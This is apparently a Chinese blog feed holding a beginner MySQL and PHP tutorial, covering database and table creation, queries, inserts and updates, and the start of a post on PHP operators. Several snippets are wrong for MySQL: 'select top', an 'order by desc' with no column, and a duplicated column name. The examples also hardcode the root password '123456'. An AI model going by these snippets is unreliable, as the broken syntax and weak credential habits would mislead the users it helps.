class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@host]# mysql -u root -p   </span><br><span class="line">Enter password:******  # 登录后进入终端</span><br><span class="line"></span><br><span class="line">mysql&gt; create DATABASE BLACKPINK;</span><br></pre></td></tr></table></figure><h4 id="使用-mysqladmin-创建数据库"><a href="#使用-mysqladmin-创建数据库" class="headerlink" title="使用 mysqladmin 创建数据库"></a>使用 mysqladmin 创建数据库</h4><p>root用户拥有最高权限，可以使用 mysql <strong>mysqladmin</strong> 命令来创建数据库。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@host]# mysqladmin -u root -p create BLACKPINK</span><br><span class="line">Enter password:******</span><br></pre></td></tr></table></figure><p>上述命令创建 MySQL 数据库 BLACKPINK。</p><h4 id="使用-PHP脚本-创建数据库"><a href="#使用-PHP脚本-创建数据库" class="headerlink" title="使用 PHP脚本 创建数据库"></a>使用 PHP脚本 创建数据库</h4><p>PHP 使用 mysqli_query 函数来创建或者删除 MySQL 数据库。</p><p>语法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_query(connection,query,resultmode);</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost &#x3D; &#39;localhost&#39;;  &#x2F;&#x2F; mysql服务器主机地址</span><br><span class="line">$dbuser &#x3D; &#39;root&#39;;            &#x2F;&#x2F; mysql用户名</span><br><span class="line">$dbpass &#x3D; &#39;123456&#39;;          &#x2F;&#x2F; mysql用户名密码</span><br><span class="line">$conn &#x3D; mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">  die(&#39;连接错误: &#39; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#39;连接成功&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">$sql &#x3D; &#39;CREATE DATABASE BLACKPINK&#39;;</span><br><span class="line">$retval &#x3D; mysqli_query($conn,$sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#39;创建数据库失败: &#39; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;数据库 BLACKPINK 创建成功\n&quot;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="MySQL-删除数据库"><a href="#MySQL-删除数据库" class="headerlink" title="MySQL 删除数据库"></a>MySQL 删除数据库</h2><h4 id="drop-命令删除数据库"><a href="#drop-命令删除数据库" class="headerlink" title="drop 命令删除数据库"></a>drop 命令删除数据库</h4><p>语法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; drop database 数据库名;</span><br></pre></td></tr></table></figure><h4 id="使用-mysqladmin-删除数据库"><a href="#使用-mysqladmin-删除数据库" class="headerlink" title="使用 mysqladmin 删除数据库"></a>使用 mysqladmin 删除数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@host]# mysqladmin -u root -p drop BLACKPINK</span><br><span class="line">Enter password:******</span><br></pre></td></tr></table></figure><p>执行以上删除数据库命令后，会出现一个提示框，来确认是否真的删除数据库。</p><h4 id="使用PHP脚本删除数据库"><a href="#使用PHP脚本删除数据库" class="headerlink" title="使用PHP脚本删除数据库"></a>使用PHP脚本删除数据库</h4><p>该命令与创建类似，不同地方在创建时</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &#39;CREATE DATABASE BLACKPINK&#39;;</span><br></pre></td></tr></table></figure><p>在删除时变为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &#39;DROP DATABASE BLACKPINK&#39;;</span><br></pre></td></tr></table></figure><p> <strong>但在使用PHP脚本删除数据库时不会出现确认是否删除信息，会直接删除指定数据库。</strong></p><h2 id="MySQL-选择数据库"><a href="#MySQL-选择数据库" class="headerlink" title="MySQL 选择数据库"></a>MySQL 选择数据库</h2><h4 id="从命令提示窗口中选择"><a href="#从命令提示窗口中选择" class="headerlink" title="从命令提示窗口中选择"></a>从命令提示窗口中选择</h4><p>命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@host]# mysql -u root -p</span><br><span class="line">Enter password:******</span><br><span class="line">mysql&gt; use BLACKPINK;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><p><strong>所有的数据库名，表名，表字段都是区分大小写的。</strong></p><h4 id="使用PHP脚本"><a href="#使用PHP脚本" class="headerlink" title="使用PHP脚本"></a>使用PHP脚本</h4><p>语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_select_db(connection,dbname);</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost &#x3D; &#39;localhost&#39;;  &#x2F;&#x2F; mysql服务器主机地址</span><br><span class="line">$dbuser &#x3D; &#39;root&#39;;            &#x2F;&#x2F; mysql用户名</span><br><span class="line">$dbpass &#x3D; &#39;123456&#39;;          &#x2F;&#x2F; mysql用户名密码</span><br><span class="line">$conn &#x3D; mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#39;连接失败: &#39; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#39;连接成功&#39;;</span><br><span class="line">mysqli_select_db($conn, &#39;BLACKPINK&#39; );</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="MySQL-创建数据表"><a href="#MySQL-创建数据表" class="headerlink" title="MySQL 创建数据表"></a>MySQL 创建数据表</h2><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE table_name (column_name column_type);</span><br></pre></td></tr></table></figure><p>实例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS &#96;blackpink_tbl&#96;(</span><br><span class="line">   &#96;blackpink_id&#96; INT UNSIGNED AUTO_INCREMENT,</span><br><span class="line">   &#96;blackpink_title&#96; VARCHAR(100) NOT NULL,</span><br><span class="line">   &#96;blackpink_author&#96; VARCHAR(40) NOT NULL,</span><br><span class="line">   &#96;submission_date&#96; DATE,</span><br><span class="line">   PRIMARY KEY ( &#96;blackpink_id&#96; )</span><br><span class="line">)ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;</span><br></pre></td></tr></table></figure><ul><li>AUTO_INCREMENT定义列为自增的属性，一般用于主键，数值会自动加1。</li><li>PRIMARY KEY关键字用于定义列为主键。 可以使用多列来定义主键，列间以逗号分隔。</li><li>ENGINE 设置存储引擎，CHARSET 设置编码。</li></ul><h4 id="使用命令提示符创建表"><a href="#使用命令提示符创建表" class="headerlink" title="使用命令提示符创建表"></a>使用命令提示符创建表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@host# mysql -u root -p</span><br><span class="line">Enter password:*******</span><br><span class="line">mysql&gt; use BLACKPINK;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; CREATE TABLE runoob_tbl(</span><br><span class="line">   blackpink_id INT NOT NULL AUTO_INCREMENT,</span><br><span class="line">   blackpink_title VARCHAR(100) NOT NULL,</span><br><span class="line">   blackpink_author VARCHAR(40) NOT NULL,</span><br><span class="line">   submission_date DATE,</span><br><span class="line">   PRIMARY KEY ( blackpink_id )</span><br><span class="line">   )ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;</span><br><span class="line">Query OK, 0 rows affected (0.16 sec)</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><h4 id="使用PHP脚本创建数据表"><a href="#使用PHP脚本创建数据表" class="headerlink" title="使用PHP脚本创建数据表"></a>使用PHP脚本创建数据表</h4><p>与创建数据库类似，将$sql处代码换成如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;CREATE TABLE blackpink_tbl( &quot;.</span><br><span class="line">        &quot;blackpink_id INT NOT NULL AUTO_INCREMENT, &quot;.</span><br><span class="line">        &quot;blackpink VARCHAR(100) NOT NULL, &quot;.</span><br><span class="line">        &quot;blackpink VARCHAR(40) NOT NULL, &quot;.</span><br><span class="line">        &quot;submission_date DATE, &quot;.</span><br><span class="line">        &quot;PRIMARY KEY ( blackpink_id ))ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8; &quot;;</span><br><span class="line">mysqli_select_db( $conn, &#39;blackpink&#39; );</span><br></pre></td></tr></table></figure><h2 id="MySQL-删除数据表"><a href="#MySQL-删除数据表" class="headerlink" title="MySQL 删除数据表"></a>MySQL 删除数据表</h2><p>语法与创建数据表类似，将create换成drop即可。</p><h2 id="MySQL-删除数据"><a href="#MySQL-删除数据" class="headerlink" title="MySQL 删除数据"></a>MySQL 删除数据</h2><p>删除&lt;满足条件的&gt;行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from &lt;表名&gt; [where &lt;删除条件&gt;]</span><br></pre></td></tr></table></figure><h2 id="MySQL-查询数据"><a href="#MySQL-查询数据" class="headerlink" title="MySQL 查询数据"></a>MySQL 查询数据</h2><p>语法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name,column_name</span><br><span class="line">FROM table_name</span><br><span class="line">[WHERE Clause]</span><br><span class="line">[LIMIT N][ OFFSET M]</span><br></pre></td></tr></table></figure><ul><li><p>查询语句可以使用一个或者多个表，表之间使用逗号分隔。</p></li><li><p>SELECT 可以读取一条或者多条记录。</p></li><li><p>使用 WHERE 语句来包含任何条件。</p></li><li><p>使用 LIMIT 属性来设定返回的记录数。</p></li><li><p>通过OFFSET指定SELECT语句开始查询的数据偏移量(默认情况下偏移量为0)</p></li></ul><h4 id="通过命令提示符"><a href="#通过命令提示符" class="headerlink" title="通过命令提示符"></a>通过命令提示符</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">1.精确（条件）查询</span><br><span class="line">select &lt;列名&gt; from &lt;表名&gt; [where &lt;查询条件表达试&gt;] [order by &lt;排序的列名&gt;[asc或desc]]</span><br><span class="line"></span><br><span class="line">2.查询所有数据行和列</span><br><span class="line">select * from &lt;表&gt;</span><br><span class="line"></span><br><span class="line">3.查询部分行列--条件查询</span><br><span class="line">select i,j,k from a where f&#x3D;5</span><br><span class="line">&#x2F;&#x2F;查询表a中f&#x3D;5的所有行，并显示i,j,k３列</span><br><span class="line"></span><br><span class="line">4.在查询中使用ＡＳ更改列名</span><br><span class="line">select name as 姓名 from a where xingbie&#x3D;&#39;男&#39;</span><br><span class="line">&#x2F;&#x2F;查询a表中性别为男的所有行，显示name列，并将name列改名为（姓名）显示</span><br><span class="line"></span><br><span class="line">5.查询空行</span><br><span class="line">select name from a where email is null</span><br><span class="line">&#x2F;&#x2F;查询表a中email为空的所有行，并显示name列；SQL语句中用is null或者is not null来判断是否为空行</span><br><span class="line"></span><br><span class="line">6.在查询中使用常量</span><br><span class="line">select name, &#39;唐山&#39; as 地址 from Student</span><br><span class="line">&#x2F;&#x2F;查询表a，显示name列，并添加地址列，其列值都为&#39;唐山&#39;</span><br><span class="line"></span><br><span class="line">7.查询返回限制行数</span><br><span class="line">select top 6 name from a</span><br><span class="line">&#x2F;&#x2F;查询表a，显示列name的前６行，top为关键字</span><br><span class="line">select top 60 percent name from a</span><br><span class="line">&#x2F;&#x2F;查询表a，显示列name的60%，percent为关键字</span><br><span class="line"></span><br><span class="line">8.查询排序（关键字：order by , asc , desc）</span><br><span class="line">例：select name from a where chengji&gt;&#x3D;60 order by desc</span><br><span class="line">&#x2F;&#x2F;查询a表中chengji大于等于60的所有行，并按降序显示name列；默认为ＡＳＣ升序</span><br><span class="line"></span><br><span class="line">9.模糊查询</span><br><span class="line">使用like进行模糊查询</span><br><span class="line">注意：like运算副只用于字符串，所以仅与char和varchar数据类型联合使用</span><br><span class="line">select * from a where name like &#39;赵%&#39;</span><br><span class="line">&#x2F;&#x2F;查询显示表a中，name字段第一个字为赵的记录</span><br><span class="line"></span><br><span class="line">使用between在某个范围内进行查询</span><br><span class="line">select * from a where nianling between 18 and 20</span><br><span class="line">&#x2F;&#x2F;查询显示表a中nianling在18到20之间的记录</span><br><span class="line"></span><br><span class="line">使用in在列举值内进行查询</span><br><span class="line">select name from a where address in (&#39;北京&#39;,&#39;上海&#39;,&#39;唐山&#39;)</span><br><span class="line">&#x2F;&#x2F;查询表a中address值为北京或者上海或者唐山的记录，显示name字段</span><br><span class="line"></span><br><span class="line">10.分组查询</span><br><span class="line">使用group by进行分组查询</span><br><span class="line">select studentID as 学员编号,AVG(score) as 平均成绩 (注释:这里的score是列名)</span><br><span class="line">from score (注释:这里的score是表名)</span><br><span class="line">group by studentID</span><br><span class="line">&#x2F;&#x2F;在表score中查询，按strdentID字段分组，显示strdentID字段和score字段的平均值；select语句中只允许被分组的列和为每个分组返回的一个值的表达式，例如用一个列名作为参数的聚合函数</span><br><span class="line"></span><br><span class="line">使用having子句进行分组筛选</span><br><span class="line">select studentID as 学员编号,AVG(score) as 平均成绩 (注释:这里的score是列名)</span><br><span class="line">from score (注释:这里的score是表名)</span><br><span class="line">group by studentID</span><br><span class="line">having count(score)&gt;1</span><br><span class="line">&#x2F;&#x2F;接上面例子，显示分组后count(score)&gt;1的行，由于where只能在没有分组时使用，分组后只能使用having来限制条件。</span><br><span class="line"></span><br><span class="line">11.多表联接查询</span><br><span class="line">内联接：</span><br><span class="line">在where子句中指定联接条件</span><br><span class="line">select a.name,b.chengji from a,b where a.name&#x3D;b.name</span><br><span class="line">&#x2F;&#x2F;查询表a和表b中name字段相等的记录，并显示表a中的name字段和表b中的chengji字段</span><br><span class="line"></span><br><span class="line">在from子句中使用join…on</span><br><span class="line">select a.name,b.chengji from a inner join b on (a.name&#x3D;b.name)</span><br><span class="line"></span><br><span class="line">外联接：</span><br><span class="line">左外联接查询</span><br><span class="line">select s.name,c.courseID,c.score from strdents as s left outer join score as c</span><br><span class="line">on s.scode&#x3D;c.strdentID</span><br><span class="line">&#x2F;&#x2F;在strdents表和score表中查询满足on条件的行，条件为score表的strdentID与strdents表中的sconde相同</span><br><span class="line"></span><br><span class="line">右外联接查询</span><br><span class="line">select s.name,c.courseID,c.score from strdents as s right outer join score as c</span><br><span class="line">on s.scode&#x3D;c.strdentID</span><br><span class="line">&#x2F;&#x2F;在strdents表和score表中查询满足on条件的行，条件为strdents表中的sconde与score表的strdentID相同</span><br></pre></td></tr></table></figure><h4 id="使用PHP脚本-1"><a href="#使用PHP脚本-1" class="headerlink" title="使用PHP脚本"></a>使用PHP脚本</h4><p>使用 <strong>mysqli_query()</strong> 及 <strong>SQL SELECT</strong> 命令来获取数据。</p><p>通过  <strong>mysqli_fetch_array()</strong> 来使用或输出所有查询的数据，该函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有 返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。</p><h2 id="MySQL-插入数据"><a href="#MySQL-插入数据" class="headerlink" title="MySQL 插入数据"></a>MySQL 插入数据</h2><p>插入单行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name ( field1, field2,...fieldN )</span><br><span class="line">                       VALUES</span><br><span class="line">                       ( value1, value2,...valueN );</span><br></pre></td></tr></table></figure><p>将现有表数据添加到一个已有表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into &lt;已有的新表&gt; (列名) select &lt;原表列名&gt; from &lt;原表名&gt;</span><br></pre></td></tr></table></figure><p>直接拿现有表数据创建一个新表并填充</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &lt;新建表列名&gt; into &lt;新建表名&gt; from &lt;源表名&gt;</span><br></pre></td></tr></table></figure><h4 id="命令提示窗口"><a href="#命令提示窗口" class="headerlink" title="命令提示窗口"></a>命令提示窗口</h4><p>实例:</p><p>如果数据是字符型，必须使用单引号或者双引号，如：”福州”。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; INSERT INTO blackpink_tbl </span><br><span class="line">       (blackpink_title, blackpink_author, submission_date)</span><br><span class="line">       VALUES</span><br><span class="line">       (&quot;大学&quot;, &quot;福州&quot;, NOW());</span><br><span class="line">Query OK, 1 rows affected, 1 warnings (0.01 sec)</span><br><span class="line">mysql&gt; INSERT INTO blackpink_tbl</span><br><span class="line">       (blackpink_title, blackpink_author, submission_date)</span><br><span class="line">       VALUES</span><br><span class="line">       (&quot;中学&quot;, &quot;漳州&quot;, &#39;2014-09-01&#39;);</span><br><span class="line">Query OK, 1 rows affected, 1 warnings (0.01 sec)</span><br><span class="line">mysql&gt; INSERT INTO blackpink_tbl</span><br><span class="line">       (blackpink_title, blackpink_author, submission_date)</span><br><span class="line">       VALUES</span><br><span class="line">       (&quot;小学&quot;, &quot;江都&quot;, &#39;2008-09-01&#39;);</span><br><span class="line">Query OK, 1 rows affected (0.00 sec)</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><p>读取数据表：select * from blackpink_tbl;</p><p>结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+--------------+-----------------+------------------+-----------------+</span><br><span class="line">| blackpink_id | blackpink_title | blackpink_author | submission_date |</span><br><span class="line">+--------------+-----------------+------------------+-----------------+</span><br><span class="line">|            1 | 大学            | 福州             | 2020-10-17      |</span><br><span class="line">|            2 | 中学            | 漳州             | 2014-09-01      |</span><br><span class="line">|            3 | 小学            | 江都             | 2008-09-01      |</span><br><span class="line">+--------------+-----------------+------------------+-----------------+</span><br></pre></td></tr></table></figure><p>同样也可使用PHP脚本插入数据。</p><h2 id="MySQL改数据"><a href="#MySQL改数据" class="headerlink" title="MySQL改数据"></a>MySQL改数据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update &lt;表名&gt; set &lt;列名&#x3D;更新值&gt; [where &lt;更新条件&gt;]</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php(二)</title>
    <link href="/2020/10/14/php%20(%E4%BA%8C)/"/>
    <url>/2020/10/14/php%20(%E4%BA%8C)/</url>
    
    <content type="html"><![CDATA[<h1 id="php-二"><a href="#php-二" class="headerlink" title="php (二)"></a>php (二)</h1><ul><li><a href="#php-%E4%BA%8C">php (二)</a><ul><li><a href="#php-%E8%BF%90%E7%AE%97%E7%AC%A6">PHP 运算符</a><ul><li><a href="#%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E7%AC%A6">算术运算符:</a></li><li><a href="#%E9%80%92%E5%A2%9E%E9%80%92%E5%87%8F%E8%BF%90%E7%AE%97%E7%AC%A6">递增/递减运算符：</a></li><li><a href="#%E6%AF%94%E8%BE%83%E8%BF%90%E7%AE%97%E7%AC%A6">比较运算符：</a></li><li><a href="#%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6">逻辑运算符:</a></li><li><a href="#%E4%B8%89%E5%85%83%E8%BF%90%E7%AE%97%E7%AC%A6">三元运算符:</a></li><li><a href="#%E7%BB%84%E5%90%88%E6%AF%94%E8%BE%83%E7%AC%A6php7">组合比较符(PHP7+):</a></li><li><a href="#%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7">运算符优先级:</a></li></ul></li><li><a href="#php%E8%AF%AD%E5%8F%A5">PHP语句</a><ul><li><a href="#if-%E8%AF%AD%E5%8F%A5">if 语句：</a></li><li><a href="#php---ifelse-%E8%AF%AD%E5%8F%A5">PHP - if…else 语句:</a></li><li><a href="#php---ifelseifelse-%E8%AF%AD%E5%8F%A5">PHP - if…elseif….else 语句:</a></li><li><a href="#switch-%E8%AF%AD%E5%8F%A5">Switch 语句：</a></li></ul></li><li><a href="#php-%E6%95%B0%E7%BB%84array">PHP 数组array()</a><ul><li><a href="#count-%E5%87%BD%E6%95%B0">count() 函数:</a></li><li><a href="#php-%E6%95%B0%E5%80%BC%E6%95%B0%E7%BB%84">PHP 数值数组：</a></li><li><a href="#%E9%81%8D%E5%8E%86%E6%95%B0%E5%80%BC%E6%95%B0%E7%BB%84">遍历数值数组:</a></li><li><a href="#%E5%85%B3%E8%81%94%E6%95%B0%E7%BB%84">关联数组:</a></li></ul></li><li><a href="#php-%E6%95%B0%E7%BB%84%E6%8E%92%E5%BA%8F">PHP 数组排序</a></li><li><a href="#php-%E8%B6%85%E7%BA%A7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F">PHP 超级全局变量</a><ul><li><a href="#globals">$GLOBALS</a></li><li><a href="#_server">$_SERVER</a></li><li><a href="#_request">$_REQUEST</a></li><li><a href="#_post">$_POST</a></li><li><a href="#_get">$_GET</a></li></ul></li><li><a href="#php-%E5%BE%AA%E7%8E%AF">PHP 循环</a><ul><li><a href="#while">while</a></li><li><a href="#dowhile-%E8%AF%AD%E5%8F%A5">do…while 语句</a></li><li><a href="#for-%E5%BE%AA%E7%8E%AF">for 循环</a></li><li><a href="#foreach-%E5%BE%AA%E7%8E%AF">foreach 循环</a></li></ul></li><li><a href="#php-%E5%87%BD%E6%95%B0">PHP 函数</a><ul><li><a href="#%E5%88%9B%E5%BB%BA-php-%E5%87%BD%E6%95%B0">创建 PHP 函数</a></li><li><a href="#php-%E5%87%BD%E6%95%B0---%E6%B7%BB%E5%8A%A0%E5%8F%82%E6%95%B0">PHP 函数 - 添加参数</a></li></ul></li><li><a href="#php-%E9%AD%94%E6%9C%AF%E5%B8%B8%E9%87%8F">PHP 魔术常量</a><ul><li><a href="#line"><strong>LINE</strong></a></li><li><a href="#file"><strong>FILE</strong></a></li><li><a href="#dir"><strong>DIR</strong></a></li><li><a href="#function"><strong>FUNCTION</strong></a></li><li><a href="#class"><strong>CLASS</strong></a></li><li><a href="#method"><strong>METHOD</strong></a></li><li><a href="#namespace"><strong>NAMESPACE</strong></a></li></ul></li></ul></li></ul><h2 id="PHP-运算符"><a href="#PHP-运算符" class="headerlink" title="PHP 运算符"></a>PHP 运算符</h2><h4 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符:"></a>算术运算符:</h4><table><thead><tr><th>x + y</th><th>x - y</th><th>x * y</th><th>x / y</th><th>x % y</th><th>- x</th><th align="center">a . b</th></tr></thead><tbody><tr><td>加</td><td>减</td><td>乘</td><td>除</td><td>模（除法的余数）</td><td>取反</td><td align="center">并置</td></tr></tbody></table><p>整除运算符 **intdiv()**，该函数返回值为第一个参数除于第二个参数的值并取整（向下取整）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(intdiv(16, 5));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>结果为3</p><h4 id="递增-递减运算符："><a href="#递增-递减运算符：" class="headerlink" title="递增/递减运算符："></a>递增/递减运算符：</h4><table><thead><tr><th align="left">运算符</th><th align="left">名称</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">++ x</td><td align="left">预递增</td><td align="left">x 加 1，然后返回 x</td></tr><tr><td align="left">x ++</td><td align="left">后递增</td><td align="left">返回 x，然后 x 加 1</td></tr><tr><td align="left">– x</td><td align="left">预递减</td><td align="left">x 减 1，然后返回 x</td></tr><tr><td align="left">x –</td><td align="left">后递减</td><td align="left">返回 x，然后 x 减 1</td></tr></tbody></table><h4 id="比较运算符："><a href="#比较运算符：" class="headerlink" title="比较运算符："></a>比较运算符：</h4><table><thead><tr><th>x == y</th><th>x === y</th><th>x !== y</th><th>x&gt;y</th><th>x&lt;y</th><th>x&gt;=y</th><th>x&lt;=y</th><th>x != y,x &lt;&gt; y</th></tr></thead><tbody><tr><td>等于</td><td>绝对等于</td><td>绝对不等于</td><td>大于</td><td>小于</td><td>大于等于</td><td>小于等于</td><td>不等于</td></tr></tbody></table><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符:"></a>逻辑运算符:</h4><table><thead><tr><th align="center">and，&amp;&amp;</th><th>or,||</th><th>xor</th><th>!x</th></tr></thead><tbody><tr><td align="center">与</td><td>或</td><td>异或</td><td>非</td></tr></tbody></table><h4 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符:"></a>三元运算符:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(expr1) ? (expr2) : (expr3) </span><br></pre></td></tr></table></figure><p>对 expr1 求值为 TRUE 时的值为 expr2，在 expr1 求值为 FALSE 时的值为 expr3。</p><h4 id="组合比较符-PHP7"><a href="#组合比较符-PHP7" class="headerlink" title="组合比较符(PHP7+):"></a>组合比较符(PHP7+):</h4><p>组合比较符（combined comparison 